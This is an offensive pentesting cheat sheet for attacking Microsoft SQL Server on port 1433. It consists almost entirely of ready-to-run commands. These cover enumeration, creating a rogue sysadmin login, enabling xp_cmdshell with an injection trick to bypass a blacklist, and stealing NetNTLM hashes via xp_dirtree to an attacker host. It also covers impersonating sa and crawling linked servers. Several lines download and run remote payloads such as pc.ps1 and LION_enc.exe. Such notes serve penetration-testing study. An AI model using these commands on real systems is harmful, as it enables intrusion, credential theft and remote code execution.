---
title: MSSQL port (1433)
source_url: https://notes.incendium.rocks/pentesting-notes/windows-pentesting/mssql-port-1433
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: windows
---

## No credentials (enumerating)

```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

## Connecting to database and commands

```bash
# Using Impacket mssqlclient.py
mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP
```

### Basic commands

```bash
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
```

## Execute commands

```bash
enable xp_cmdshell // Enable cmdshell with mssqlclient
xp_cmdshell <windows command>

// Use EXEC within mssqlclient
EXEC master..xp_cmdshell 'whoami'

# Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'whoami /all' —
```

### With CrackMapExec

```bash
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
```

## Steal NetNTLM hash / Relay attack

```bash
// Setup responder to poison the request:
sudo responder.py -I tun0 -v

// In MSSQL execute:
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
EXEC master..xp_fileexist '\\<attacker_IP>\anything\'

```

## Privilege Escalation

### Impersonate users

```sql
# Find users you can impersonate
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
# Check if the user "sa" or any other high privileged user is mentioned

# Impersonate sa user
EXECUTE AS LOGIN = 'sa' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
```

## Trusted links

#### Using PowerShell

```powershell
Import-Module .\PowerupSQL.psd1

#Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test

## FROM INSIDE OF THE DOMAIN
#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting form the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"
```

#### Using MSSQL

```sql
# Enable xp_cmd shell on linked server
osql -E -S "LOCALSERVER" -Q "EXECUTE('sp_configure''xp_cmdshell'',1;RECONFIGURE;') AT [LINKED_SERVER]"

# RCE
osql -E -S "LOCALSERVER" -Q "EXECUTE('xp_cmdshell whoami') AT [LINKED_SERVER];"

# Download & Start-Process
osql -E -S "LOCALSERVER" -Q "EXECUTE('exec master..xp_cmdshell ''powershell -NoP -NonI -c Invoke-WebRequest -Uri http://10.10.15.224:8080/LION_enc.exe -OutFile c:\windows\tasks\LION_enc.exe''') AT [LINKED_SERVER]"
osql -E -S "LOCALSERVER" -Q "EXECUTE('exec master..xp_cmdshell ''powershell -c Start-Process -NoNewWindow -FilePath c:\windows\tasks\LION_enc.exe''') AT [LINKED_SERVER]"
```
